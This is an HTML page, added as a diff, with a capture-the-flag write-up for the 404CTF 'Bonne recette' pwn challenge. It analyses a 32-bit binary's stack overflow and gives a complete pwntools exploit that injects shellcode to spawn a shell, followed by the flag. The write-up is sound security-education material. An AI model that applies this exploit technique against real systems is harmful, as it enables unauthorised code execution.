@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+
+<style type="text/css">.pandoc-post {
+background: #1a1b26;
+color: #c0caf5;
+padding: 2.5rem 3rem;
+border-radius: 1rem;
+font-family: "Inter", "Segoe UI", sans-serif;
+line-height: 1.75;
+width: 100%;
+box-sizing: border-box;
+box-shadow: 0 0 25px rgba(122, 162, 247, 0.15);
+}
+.pandoc-post h1,
+.pandoc-post h2,
+.pandoc-post h3,
+.pandoc-post h4 {
+color: #7aa2f7;
+}
+.pandoc-post a {
+color: #7aa2f7;
+}
+.pandoc-post p {
+color: #c0caf5;
+}
+.pandoc-post blockquote {
+border-left: 4px solid #7aa2f7;
+padding-left: 1rem;
+color: #a9b1d6;
+font-style: italic;
+background: rgba(36, 40, 59, 0.4);
+}
+.pandoc-post div.sourceCode {
+background: #24283b;
+border-radius: 10px;
+padding: 1rem;
+overflow-x: auto;
+border: 1px solid #2f3549;
+margin: 1.5rem 0;
+}
+.pandoc-post pre.sourceCode {
+background: transparent;
+margin: 0;
+padding: 0;
+}
+.pandoc-post code.sourceCode {
+background: transparent;
+color: #c0caf5;
+font-family: "JetBrains Mono", monospace;
+display: block;
+white-space: pre;
+}
+.pandoc-post .kw { color: #c792ea; font-weight: 500; }
+.pandoc-post .st { color: #a6e3a1; }
+.pandoc-post .co { color: #5c6370; font-style: italic; }
+.pandoc-post .fu { color: #61afef; }
+.pandoc-post .va { color: #e06c75; }
+.pandoc-post .dv { color: #d19a66; }
+.pandoc-post .op { color: #56b6c2; }
+.pandoc-post .dt { color: #e5c07b; }
+.pandoc-post img {
+display: block;
+max-width: 100%;
+width: 100%;
+height: auto;
+margin: 1.5rem auto;
+border-radius: 0.5rem;
+object-fit: contain;
+}
+</style>
+</head>
+
+<body>
+
+<div class="pandoc-post">
+<h1 id="bonne-recette">Bonne recette</h1>
+<h2 id="challenge">Challenge</h2>
+<p>Checksec :</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/home/kali/Documents/CTF/404CTF/404CTF2026/pwn/bonne-recette/chall&#39;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>       i386-32-little</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>      Partial RELRO</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>      No canary found</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>         NX unknown <span class="at">-</span> GNU_STACK missing</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>        PIE enabled</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>      Executable</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RWX:</span>        Has RWX segments</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RUNPATH:</span>    b<span class="st">&#39;./&#39;</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stripped:</span>   No</span></code></pre></div>
+<h2 id="analysis">Analysis</h2>
+<p>We don’t have the source for this binary so I used ghidra, here’s the decompilation result :</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">void</span><span class="op">)</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  uint __seed<span class="op">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> buffer <span class="op">[</span><span class="dv">1024</span><span class="op">];</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> randnum<span class="op">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>  undefined1 <span class="op">*</span>local_10<span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>  local_10 <span class="op">=</span> <span class="op">&amp;</span>stack0x00000004<span class="op">;</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>_stdin<span class="op">,(</span><span class="dt">char</span> <span class="op">*)</span><span class="bn">0x0</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>_stdout<span class="op">,(</span><span class="dt">char</span> <span class="op">*)</span><span class="bn">0x0</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>_stderr<span class="op">,(</span><span class="dt">char</span> <span class="op">*)</span><span class="bn">0x0</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>  __seed <span class="op">=</span> time<span class="op">((</span><span class="dt">time_t</span> <span class="op">*)</span><span class="bn">0x0</span><span class="op">);</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>  srand<span class="op">(</span>__seed<span class="op">);</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>  randnum <span class="op">=</span> rand<span class="op">();</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>  randnum <span class="op">=</span> randnum <span class="op">%</span> <span class="dv">512</span><span class="op">;</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(&amp;</span>DAT_00012008<span class="op">);</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;Malheureusement elle a perdu ses livres de recettes.&quot;</span><span class="op">);</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(&amp;</span>DAT_000120a4<span class="op">,</span>buffer <span class="op">+</span> randnum<span class="op">);</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;Pouvez vous lui donner ?&quot;</span><span class="op">);</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>  fgets<span class="op">(</span>buffer<span class="op">,</span><span class="dv">2048</span><span class="op">,</span>_stdin<span class="op">);</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>There is an obvious buffer overflow in <code>buffer</code>.</p>
+<p>The challenge also gives us a leak at a random offset in the stack. At first I did not understand why that was needed and since the stack is executable it seemed like it was just a basic ret2shellcode exploit.</p>
+<p>But when debugging I looked closer to the assembly code just before the return :</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x56556303</span> <span class="op">&lt;</span>+278<span class="op">&gt;</span>:   pop    ecx</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x56556304</span> <span class="op">&lt;</span>+279<span class="op">&gt;</span>:   pop    ebx</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x56556305</span> <span class="op">&lt;</span>+280<span class="op">&gt;</span>:   pop    ebp</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x56556306</span> <span class="op">&lt;</span>+281<span class="op">&gt;</span>:   lea    esp,<span class="pp">[</span><span class="ss">ecx</span><span class="pp">-</span><span class="ss">0x4</span><span class="pp">]</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">=</span><span class="op">&gt;</span> 0x56556309 <span class="op">&lt;</span>+284<span class="op">&gt;</span>:   ret</span></code></pre></div>
+<p>The <code>esp</code> register is set using a value taken from the stack (coming from <code>ecx</code> which is popped from the stack). This means that if we just overwrite the stack with random characters up to the return address, <code>pop ecx</code> will set <code>ecx</code> to a random value and <code>lea esp,[ecx-0x4]</code> will set <code>esp</code> to a wrong value not pointing to our shellcode.</p>
+<p>Here the stack leak comes in handy !</p>
+<p>Since we know that the leak gives us an address inside the <code>buffer</code> variable that we control, and that the address points in the first 512 bytes of the buffer (<code>randnum % 512;</code>), then we can just fill up the buffer with the leak+512. This will point at least in the second part of the buffer. We can then fill this second part with a nop sled. Finally we just have to put the leaked stack address at the end of our payload just before the shellcode with some other fill up values (for <code>ebx</code> and <code>ebp</code>) to make sure it is popped into <code>ecx</code>. But there is a <strong>problem</strong> : the values put just before the shellcode to fill registers will be in the way when the execution flow will go through de nop sled :</p>
+<p><em>[Schema]</em></p>
+<p>So we need to add a relative jump to jump over those values and land just after them in the shellcode. For more security I jumped a little further and put a nop sled just before the shellcode to ensure a nice, soft and precise landing !</p>
+<p><u><strong>Note</strong></u>: A little brute force will be needed because this idea will only work if addresses are aligned. But the offset is a random int so it could give unaligned addresses. Since we are on a 32 bits programm addresses are 4 bytes long so we have 1/4 chance that the offset is aligned. Hopefully it’s a small brute force so it should not be a problem.</p>
+<p>To recap here’s the plan :</p>
+<ol type="1">
+<li><p>Get leaked stack value (let’s call it <code>leak</code>) and calculate <code>target = leak + 512</code>. This points to second half of the buffer.</p></li>
+<li><p>Fill up the first half of the buffer with <code>target</code> and the second half with a nop sled (<code>512*b&quot;\x90&quot;</code>)</p></li>
+<li><p>Add a relative jump instruction at the end of the nop sled, just before the shellcode</p></li>
+<li><p>Add the leaked address and 2 fill up 4 bytes addresses to make sure <code>leak</code> is popped into <code>ecx</code> and <code>ebx</code> and <code>ebp</code> are also popped.</p></li>
+<li><p>Add shellcode at the end of the paylaod and send it. Enjoy the shell !</p></li>
+</ol>
+<p>Final code :</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>exe <span class="op">=</span> ELF(<span class="st">&quot;chall_patched&quot;</span>)</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> ELF(<span class="st">&quot;libc.so.6&quot;</span>)</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>ld <span class="op">=</span> ELF(<span class="st">&quot;ld-linux.so.2&quot;</span>)</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>context.binary <span class="op">=</span> exe</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> conn():</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> args.REMOTE:</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> process([exe.path])</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> args.GDB:</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>            script <span class="op">=</span> <span class="st">&quot;&quot;&quot;</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="st">            b *main+284</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="st">            &quot;&quot;&quot;</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>            gdb.attach(r, gdbscript<span class="op">=</span>script)</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> remote(<span class="st">&quot;spawn.404ctf.fr&quot;</span>, <span class="dv">10304</span>)</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> r</span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> main():</span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> conn()</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">b&quot;dans son placard &quot;</span>)</span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>    leak <span class="op">=</span> r.recvline().replace(<span class="st">b&quot;.&quot;</span>, <span class="st">b&quot;&quot;</span>).strip().decode()</span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>    leak <span class="op">=</span> <span class="bu">int</span>(leak[<span class="dv">2</span>:], <span class="dv">16</span>)</span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>    target <span class="op">=</span> leak <span class="op">+</span> <span class="dv">512</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="ss">f&quot;Stack leak : </span><span class="sc">{</span><span class="bu">hex</span>(leak)<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>    log.info(<span class="ss">f&quot;Target : </span><span class="sc">{</span><span class="bu">hex</span>(target)<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> p32(target)<span class="op">*</span>(<span class="dv">512</span><span class="op">//</span><span class="dv">4</span>) </span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>    <span class="co"># add a jump instruction to jump over next values used for register setting</span></span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>    jmp <span class="op">=</span> <span class="bu">bytes</span>(asm(<span class="st">&quot;jmp $+24&quot;</span>))</span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>    <span class="co">#jump 24 bytes ahead (more than 3 addresses to be sure, use a nop sled for security before shellcode)</span></span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> <span class="st">b&quot;</span><span class="ch">\x90</span><span class="st">&quot;</span><span class="op">*</span>(<span class="dv">512</span><span class="op">+</span><span class="dv">4</span><span class="op">-</span><span class="bu">len</span>(jmp)) <span class="co">#offset has one more address on the stack before registers so +4</span></span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> jmp </span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> p32(leak) <span class="co">#ecx</span></span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> <span class="st">b&quot;JUNK&quot;</span><span class="op">*</span><span class="dv">2</span> <span class="co">#ebx and ebp</span></span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-50"><a href="#cb4-50" aria-hidden="true" tabindex="-1"></a>    shellcode <span class="op">=</span> shellcraft.sh()</span>
+<span id="cb4-51"><a href="#cb4-51" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> <span class="st">b&quot;</span><span class="ch">\x90</span><span class="st">&quot;</span><span class="op">*</span><span class="dv">24</span> <span class="op">+</span> <span class="bu">bytes</span>(asm(shellcode)) <span class="co">#add a security nop sled</span></span>
+<span id="cb4-52"><a href="#cb4-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-53"><a href="#cb4-53" aria-hidden="true" tabindex="-1"></a>    r.sendlineafter(<span class="st">b&quot;Pouvez vous lui donner ?</span><span class="ch">\n</span><span class="st">&quot;</span>, payload)</span>
+<span id="cb4-54"><a href="#cb4-54" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-55"><a href="#cb4-55" aria-hidden="true" tabindex="-1"></a>    r.interactive()</span>
+<span id="cb4-56"><a href="#cb4-56" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-57"><a href="#cb4-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-58"><a href="#cb4-58" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
+<span id="cb4-59"><a href="#cb4-59" aria-hidden="true" tabindex="-1"></a>    main()</span></code></pre></div>
+<p><u><b>FLAG</b></u> : 404TCF{K4BO0M}</p>
+</div>
+
+</body>
+</html>
